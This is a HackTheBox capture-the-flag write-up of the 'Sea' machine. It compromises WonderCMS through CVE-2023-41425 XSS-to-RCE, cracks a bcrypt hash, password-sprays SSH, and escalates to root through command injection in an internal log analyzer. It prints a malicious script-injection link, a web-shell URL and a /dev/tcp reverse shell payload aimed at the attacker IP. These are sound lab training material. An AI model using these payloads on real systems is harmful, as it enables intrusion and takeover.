---
tags:
  - CVE-2023-41425
  - wondercms
group: Linux
---
![](https://labs.hackthebox.com/storage/avatars/0011f6725aed869f8683589cb08c90d0.png)

- Machine : https://app.hackthebox.com/machines/Sea
- Reference : https://0xdf.gitlab.io/2024/12/21/htb-sea.html
- Solved : 2025.3.17. (Mon) (Takes 2days)

## Summary
---

1. **Initial Enumeration**
    - **Open Ports**: SSH (22), HTTP (80)
    - **Web Enumeration**:
        - Identified domain `sea.htb` and added it to `/etc/hosts`.
        - `feroxbuster` discovered endpoints like `/data/`, `/themes/`, `/plugins/`, `/messages/`.
        - Found CMS version info under `/themes/bike/version` → Version `3.2.0`, author `turboblack`, theme `animated`.
        - Based on keywords, identified the CMS as **WonderCMS**.
        
2. **Web Exploitation**
    - **CVE-2023-41425 (WonderCMS XSS to RCE)**:
        - Exploit uses a reflected XSS to execute background requests and upload a shell.
        - Injected malicious XSS link via `/contact.php`.
        - Triggered reverse shell connection as `www-data`.
        
3. **Privilege Escalation to `amay`**
    - **Credential Discovery**:
        - Found a bcrypt password hash in `/var/www/sea/data/database.js`.
        - Cracked the hash using `hashcat` → Password: `mychemicalromance`.
    - **Password Spray Attack**:
        - Used `crackmapexec` to test credentials across users.
        - Successful SSH login as `amay`.
        
4. **Lateral Movement to `geo`**
    - **SSH Port Forwarding**:
        - Forwarded local port 8080 to access internal service.
        - Used `amay`'s credentials to log into the web interface on port 8080.
        
5. **Privilege Escalation to `root`**
    - **Command Injection in Log Analyzer**:
        - Detected time-based injection via `log_file` parameter (`;sleep 2`).
        - Confirmed command execution as `root`.
        - Injected reverse shell payload to gain `root` access.

### Key Techniques:

- **Directory & Web Content Enumeration**: `feroxbuster`, CMS fingerprinting
- **CVE Exploitation**: XSS to shell upload (CVE-2023-41425)
- **Password Cracking**: Cracked bcrypt hash using `hashcat`
- **Credential Reuse**: Password spray using `crackmapexec`
- **Port Forwarding**: SSH local port forwarding to access internal services
- **Command Injection**: Exploited log analysis interface to run commands as root

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ /opt/custom-scripts/port-scan.sh 10.10.11.28    
[*] Performing quick TCP port scan on 10.10.11.28...
[*] Performing quick UDP port scan on 10.10.11.28 (top 1000 UDP ports)...
[+] Found open TCP ports: 22,80
[*] Performing detailed TCP scan on 10.10.11.28...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-16 12:47 MDT
Nmap scan report for 10.10.11.28
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http(80)

![](attachments/sea_1.png)

There's a link contains domain name. Let's add this to `/etc/hosts`.

![](attachments/sea_2.png)

`feroxbuster` has found several pages.

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ feroxbuster -u http://sea.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://sea.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       84l      209w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb/data/
301      GET        7l       20w      230c http://sea.htb/themes => http://sea.htb/themes/
301      GET        7l       20w      231c http://sea.htb/plugins => http://sea.htb/plugins/
301      GET        7l       20w      232c http://sea.htb/messages => http://sea.htb/messages/
404      GET        0l        0w     3341c http://sea.htb/data/static
301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
404      GET        0l        0w     3341c http://sea.htb/messages/amazon_payments
404      GET        0l        0w     3341c http://sea.htb/messages/formteszt
[####################] - 3m    180012/180012  0s      found:11      errors:2507
[####################] - 3m     30000/30000   152/s   http://sea.htb/ 
[####################] - 3m     30000/30000   153/s   http://sea.htb/data/ 
[####################] - 3m     30000/30000   160/s   http://sea.htb/themes/ 
[####################] - 3m     30000/30000   159/s   http://sea.htb/plugins/ 
[####################] - 3m     30000/30000   158/s   http://sea.htb/messages/ 
[####################] - 3m     30000/30000   164/s   http://sea.htb/themes/bike/  
```

With the found pages under `/themes/bike`, I can get a hint.

```sql
┌──(kali㉿kali)-[~/htb/sea]
└─$ curl http://sea.htb/themes/bike/version
3.2.0


┌──(kali㉿kali)-[~/htb/sea]
└─$ curl http://sea.htb/themes/bike/summary
Animated bike theme, providing more interaction to your visitors.

┌──(kali㉿kali)-[~/htb/sea]
└─$ curl http://sea.htb/themes/bike/LICENSE
MIT License

Copyright (c) 2019 turboblack

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

With the keyword "bike", "animated", "turboblack", "3.2.0", let's google to find what the CMS is.

![](attachments/sea_3.png)

It seems that the CMS running is WonderCMS.
Also, there's `README.md` file.

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ curl http://sea.htb/themes/bike/README.md
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```



# Shell as `www-data`

###  CVE-2023-41425

I googled to find if there's any vulnerability on WonderCMS.
Here's the [repo](https://github.com/duck-sec/CVE-2023-41425) of the exploit.

The attached exploit "exploit.py" performs the following actions:
1. It takes 3 arguments:
    - URL: where WonderCMS is installed (no need to know the password)
    - IP: attacker's Machine IP
    - Port No: attacker's Machine PORT
2. It generates an xss.js file (for reflected XSS) and outputs a malicious link.
3. As soon as the admin (logged user) opens/clicks the malicious link, a few background requests are made without admin acknowledgement to upload a shell via the upload theme/plugin functionality.
4. After uploading the shell, it executes the shell and the attacker gets the reverse connection of the server.

For the admin opening a malicious link part, I think I can utilize `/contact.php` page by inserting link.

```bash
┌──(kali㉿kali)-[~/htb/sea/CVE-2023-41425]
└─$ python exploit.py -u http://sea.htb/loginURL -lh 10.10.14.15 -lp 9000 -sh 10.10.14.15 -sp 8000
##################################
# Wondercms 4.3.2 XSS to RCE     #
# Original POC by prodigiousMind #
# Updated version by Ducksec     #
##################################


Check you got this stuff right!


Parsed arguments:
URL: http://sea.htb/loginURL
LHOST: 10.10.14.15
LPORT: 9000
SRVHOST: 10.10.14.15
SRVPORT: 8000


[+] xss.js is created
[+] Execute the below command in another terminal:

----------------------------
nc -lvp 9000
----------------------------

Send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.15:8000/xss.js"></script><form+action="
----------------------------



[+] Ensure that main.zip is still in this directory.
[+] Once the target successfully requests main.zip it's safe to kill this script.


[+] Once complete, you can also re-exploit by requesting: http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.15&lport=9000

Starting HTTP server to allow access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [16/Mar/2025 20:27:58] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [16/Mar/2025 20:28:05] "GET /main.zip HTTP/1.1" 200 -
```

![](attachments/sea_4.png)

I submitted the created link on the contact form.
Then, I connected to the generated link;
`http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.15&lport=9000`

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ nc -nlvp 9000           
listening on [any] 9000 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.28] 60950
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 02:29:13 up  7:47,  0 users,  load average: 0.86, 0.85, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

```bash
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@sea:/tmp$ ^Z
zsh: suspended  nc -nlvp 9000

┌──(kali㉿kali)-[~/htb/sea]
└─$ stty raw -echo; fg       
[1]  + continued  nc -nlvp 9000
                               reset
Terminal type? screen
www-data@sea:/tmp$ 
```

Then I got `www-data`'s shell!



# Shell as `amay`

### Enumeration

Let's check what users are available on the system.

```bash
www-data@sea:/tmp$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```

```bash
www-data@sea:/var/www/sea$ ss -lntp
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        10             127.0.0.1:48095          0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:8080           0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
LISTEN  0        511                    *:80                   *:*              
LISTEN  0        128                 [::]:22                [::]:*              
```

Port 8080 is running additionally.

```bash
www-data@sea:/var/www/sea$ curl -v http://localhost:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 401 Unauthorized
< Host: localhost:8080
< Date: Mon, 17 Mar 2025 03:01:25 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.23
< WWW-Authenticate: Basic realm="Restricted Area"
< Content-type: text/html; charset=UTF-8
< 
* Closing connection 0
```

But based on `WWW-Authenticate` header, it is somewhat restricted.

```bash
www-data@sea:/var/www/sea/data$ cat database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
```

There's a hash found here :
`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`
I removed `\` since it seems that it's for escape.

### Crack hash

Let's try cracking it.

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...SNIP...

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))

...SNIP...
```

The cracked password is `mychemicalromance`.

Let's try password spray on all found user accounts.

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ cat users.txt   
root
amay
geo
```

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ crackmapexec ssh sea.htb -u users -p mychemicalromance --continue-on-success
SSH         10.10.11.28     22     sea.htb          [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.10.11.28     22     sea.htb          [-] geo:mychemicalromance Authentication failed.
SSH         10.10.11.28     22     sea.htb          [+] amay:mychemicalromance  (non root) Linux - Shell access!
SSH         10.10.11.28     22     sea.htb          [-] root:mychemicalromance Authentication failed.
```

### ssh login

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ ssh amay@sea.htb                         
The authenticity of host 'sea.htb (10.10.11.28)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'sea.htb' (ED25519) to the list of known hosts.
amay@sea.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

...SNIP...

Last login: Mon Aug  5 07:16:49 2024 from 10.10.14.40
amay@sea:~$ id
uid=1000(amay) gid=1000(amay) groups=1000(amay)
amay@sea:~$ whoami
amay
```



# Shell as `geo`

### SSH Local Port Forwarding

To connect to port 8080 from Kali, I setup a local port forwarding via ssh.

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ ssh -L 8080:localhost:8080 amay@sea.htb      
amay@sea.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

...SNIP...

Last login: Mon Mar 17 03:20:10 2025 from 10.10.14.15
amay@sea:~$ 
```

Then, I can connect to the service running on port 8080 through localhost:8080.

![](attachments/sea_5.png)

I just reused the credential for `amay` (pw : `mychemicalromance`), and got signed-in.

![](attachments/sea_6.png)

### File Read Vulnerability

It seems that I got landed on a page that can query the system.

![](attachments/sea_7.png)

When I click "Analyze" button, I can capture the POST request.

```yaml
POST / HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://127.0.0.1:8888
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://127.0.0.1:8888/
Cookie: ajs_anonymous_id=3e8d5dcc-9e4d-4e52-b476-45428f7e5d89
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```

I can see that the request is querying `/var/log/apache/access.log` file using `log_file` parameter.

I modified the path for test, and simply proved that the it can be lead to local file read vulnerability.

![](attachments/sea_8.png)

However, couldn't find useful file to escalate privileges.

![](attachments/sea_9.png)

### Command Injection

Now I moved onto command injection.
I added `;sleep 0` on `log_file` parameter, and measure the response time.

![](attachments/sea_10.png)

However, when I changed the sleeping time to 2, the response time also increased to 2 seconds.

![](attachments/sea_11.png)

Now I added `whoami` command.
Initially, naive `whoami` doesn't work.
But it worked when I added `#` to comment the following part out.

![](attachments/sea_12.png)

It turned out that the command is run by `root`.

To open a reverse shell, I put the following payload :
`bash+-c+'sh+-i+>%26+/dev/tcp/10.10.14.15/9001+0>%261'`

![](attachments/sea_13.png)

```bash
┌──(kali㉿kali)-[~/htb/sea]
└─$ nc -nlvp 9001           
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.28] 33822
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

Then, I can get a shell as `root`.